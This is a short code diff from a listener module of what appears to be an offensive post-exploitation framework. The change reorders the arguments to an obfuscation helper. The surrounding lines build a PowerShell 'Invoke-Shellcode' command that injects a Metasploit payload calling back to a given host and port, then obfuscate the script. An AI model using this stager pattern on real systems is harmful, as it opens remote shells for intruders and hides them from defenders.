@@ -102,7 +102,7 @@ class Listener:
             script = helpers.strip_powershell_comments(script)
             script += "\nInvoke-Shellcode -Payload %s -Lhost %s -Lport %s -Force" % (msfPayload, host, port)
             if obfuscate:
-                script = helpers.obfuscate(script, self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
+                script = helpers.obfuscate(self.mainMenu.installPath, script, obfuscationCommand=obfuscationCommand)
             return script
 
         else:
